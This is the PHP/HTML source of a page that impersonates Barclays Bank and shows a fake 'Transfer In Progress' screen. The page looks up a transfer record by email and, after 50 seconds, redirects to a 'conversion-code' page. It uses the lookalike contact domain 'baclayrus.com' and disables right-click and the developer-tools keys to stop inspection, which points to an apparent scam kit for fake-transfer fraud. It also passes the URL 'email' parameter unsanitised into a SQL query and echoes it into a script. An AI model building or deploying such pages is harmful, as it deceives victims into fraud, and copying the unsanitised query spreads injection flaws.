<title>Barclays Bank - Account Transfer</title>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <link rel="icon" type="png" href="image/logoshsbc.png" style="width:5%">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.1/css/all.css"
        integrity="sha384-gfdkjb5BdAXd+lj+gudLWI+BXq4IuLW5IT+brZEZsLFm++aCMlF1V92rMkPaX4PP" crossorigin="anonymous">
    <link rel="stylesheet" href="css/bootstrap.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
    <script src="https://kit.fontawesome.com/fc383a6465.js" crossorigin="anonymous"></script>
    <script src="https://kit.fontawesome.com/1f706328f3.js" crossorigin="anonymous"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300&display=swap" rel="stylesheet">
    <meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<style>
* {
    font-family: 'Heebo', sans-serif;
}
</style>

<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<style>
table {
    border-collapse: separate;
    border-spacing: 0;

}

th,
td {
    padding: 10px 15px;
}

thead {
    background: #395870;
    color: #fff;
}

th {
    font-size: 20px;
    background: #395870;
    color: #ffffff;
    border-bottom: 1px solid #ffffff;
    border-right: 1px solid #ffffff;
	font-family: 'Source Sans Pro', sans-serif;
}

tbody tr:nth-child(even) {
    background: #f0f0f2;
}

td {
    border-bottom: 1px solid #cecfd5;
    border-right: 1px solid #cecfd5;
    font-family: 'Source Sans Pro', sans-serif;
    font-size: 30px;
    text-align: center;

}

td:first-child {
    border-left: 1px solid #cecfd5;
}

.center {
    margin-left: auto;
    margin-right: auto;
}

h6 {
    font-size: 20px;
}
</style>
<style>
#blink {
    font-size: 20px;
    font-weight: bold;
    color: #ffffff;
    transition: 0.5s;
}
</style>

<body>
    <section style="background-color:#c2c2a3">
        <div class="container">
            <div class="row">
                <div class="col-md-2">
                    <div style="height:5px"></div>
                    <div style="height:55px;background-color:#000066;border:1px solid #000066;width:200px;">
                        <p style="text-align:center;padding-top:10px;"><img src="Image/barclays-log.png"
                                style="width:190px;height:30px;"></p>
                    </div>
                </div>
                <div class="col-md-8">
                    <p
					style="font-size:35px;font-family: 'Source Sans Pro', sans-serif;color:#000066;text-align:center;padding-top:5px;">
                        Welcome To The Barclays Bank One Technology</p>
                </div>
                  <div class="col-md-2" style="margin-top:20px;">
                                       
   <div id="google_translate_element" style="background-color:#000000;opacity:0.6;width:200px;"></div>
    <script type="text/javascript">
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({ pageLanguage: 'en', includedLanguages: 'zh-CN,cs,da,nl,en,et,fr,vi' }, 'google_translate_element');
        }

    </script>

    <script type="text/javascript"
        src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
                </div>
            </div>
            <div>
    </section>
    <div style="height:50px"></div>

    <div id="Sign In" align="center">
        <div
            style="background-color:#5c5c3d;width:300px;height:50px;border:2px solid #5c8a8a;text-align:center;color:#ffffff;font-size:30px;font-family: 'Source Sans Pro', sans-serif;">
            Device Information
        </div>
    </div>

    <div style="height:40px"></div>
    <div id="Sign In" align="center">
        <div class="container">
            <div class="row">
                <div class="col-md-1">
                </div>
                <div class="col-md-10">
                    <p style="font-size:25px;font-family: 'Source Sans Pro', sans-serif;">
                        <?php  echo 'Your IP Address is - '.$_SERVER['REMOTE_ADDR'];?> <span
                            style="font-size:25px;font-family: 'Source Sans Pro', sans-serif;">Time: </span><span
                            id="rest" style="font-size:25px;font-family: 'Source Sans Pro', sans-serif;"></span></p>
                    <script>
                    var europeTime = new Date().toLocaleString("en-US", {
                        timeZone: "Europe/London"
                    });
                    europeTime = new Date(europeTime);
                    console.log('Europe time: ' + europeTime.toLocaleString())
                    document.getElementById('rest').innerHTML = europeTime.toLocaleString();
                    </script>
                </div>
                <div class="col-md-1">
                </div>
            </div>
        </div>
    </div>
    <div style="height:40px"></div>

    <div id="Sign In" align="center">
        <div style="height:40px"></div>
        <div class="container">
            <div class="row">
                <div class="col-md-1">
                </div>
                <div class="col-md-10 contentarea">
                    <table>
                        <tr>
                            <th>Account Name:</th>
                            <th>&nbsp Account Number:</th>
                            <th>&nbsp IFSC Code:</th>
                            <th>&nbsp Amount:</th>
                            <th>&nbsp Transfer Status:</th>
                        </tr>
                        <?php
$conn=new mysqli("localhost","root","","glen");
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$email = $_GET['email'];
$sql = "SELECT Trans_ID, name,code,bank,number,current,amount FROM ahun WHERE email = '$email' ORDER BY Trans_ID DESC LIMIT 1";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
echo "<tr><td>" . $row["name"]. "</td><td>" . $row["number"] . "</td><td>"
. $row["code"]. "</td><td>". $row["current"]. " ". $row["amount"]. "</td><td>Transfer In Progress</td></tr>";
}
echo "</table>";
} else { echo "0 results"; }
$conn->close();
?>
                    </table>

                </div>
                <div class="col-md-1">
                </div>
            </div>
        </div>
    </div><br><br>

    <div id="Sign In" align="center">

        <section>
            <div class="container">
                <div class="row main-div">
                    <div class="col-md-1">
                    </div>

                    <div class="col-md-10">

                        <div class="row">
                            <p style="color:#000;font-size:25px;text-align:center;">
                                <?php
						$current = strtoupper($_GET['current']);
			
                            echo "Please Wait While Transfer In Process";
                            
                        ?>

                            </p>
                        </div>

                        <?php
						if($current == '£')
						{
							?>
                        <marquee width="100%" direction="right" scrollamount="100">
                            <img src="Image/b81_0481a_pounds.jpg" width="300" height="150">
                        </marquee>

                        <?php
						}
						else if($current == 'NPR')
						{
							?>
                        <marquee width="100%" direction="right" scrollamount="100">
                            <img src="Image/5caf6d02bea02d22bc41d7d90fbc7ff7.jpg" width="300" height="150">
                        </marquee>

                        <?php
						}
						else if($current == 'PKR')
						{
							?>
                        <marquee width="100%" direction="right" scrollamount="100">
                            <img src="Image/pkr-hero.jpg" width="300" height="150">
                        </marquee>

                        <?php
						}
						else if($current == '₹')
						{
							?>
                        <marquee width="100%" direction="right" scrollamount="100">
                            <img src="Image/1200px-India_new_2000_INR,_MG_series,_2016,_obverse.jpg" width="300"
                                height="150">
                        </marquee>

                        <?php
						}

						else if($current == 'YEN')
						{
							?>
                        <marquee width="100%" direction="right" scrollamount="100">
                            <img src="Image/1000_yen_Natsume_Soseki.jpg" width="300" height="150">
                        </marquee>

                        <?php
						}

						else if($current == 'YUAN')
						{
							?>
                        <marquee width="100%" direction="right" scrollamount="100">
                            <img src="Image/Chinese-banknote.jpg" width="300" height="150">
                        </marquee>

                        <?php
						}
						else if($current == 'BHAT')
						{
							?>
                        <marquee width="100%" direction="right" scrollamount="100">
                            <img src="Image/thailand-bhatt.jpg" width="300" height="150">
                        </marquee>

                        <?php
						}
						else if($current == 'đ‎')
						{
							?>
                        <marquee width="100%" direction="right" scrollamount="100">
                            <img src="Image/vietnamese-dong.jpg" width="300" height="150">
                        </marquee>

                        <?php
						}
						if($current == '$')
						{
							?>
                        <marquee width="100%" direction="right" scrollamount="100">
                            <img src="Image/100-american-dollars-banknote-obverse-1.jpg" width="300" height="150">
                        </marquee>
                        <?php
						}
						else if($current == 'EURO')
						{
							?>
                        <marquee width="100%" direction="right" scrollamount="100">
                            <img src="Image/100-euros-banknote-first-series-obverse-1.jpg" width="300" height="150">
                        </marquee>

                        <?php
						}
					?>




                    </div>
                    <div class="col-md-1">
                    </div>
                </div>
            </div>


        </section>



        <div class="divspace"></div>
        <div>Note:
            To allow us to serve you better, please inform us of any changes in your personal details
        </div>
    </div>


    </div>

    <div style="height:40px;"></div>
    <div id="Sign In" align="center">
        <div style="background-color:#ffc266;width:700px;height:3px;"></div>
        <span style="font-size:15px;color:#000000;padding-bottom:60px;float:center;"> This is under the Barclays Bank Plc.|
            &#169 All Rights Reserved 2019. | For enquiries:enquirydept@baclayrus.com< </span>
    </div>


</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script>
setTimeout(() => {
    location.assign("conversion-code.php?email=<?=$email?>");
}, 50000);
</script>
<script>
document.addEventListener('contextmenu', event => event.preventDefault());

$(document).keydown(function(event) {
    if (event.keyCode == 123) { // Prevent F12
        return false;
    } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
        return false;
    }
});
</script>

</html>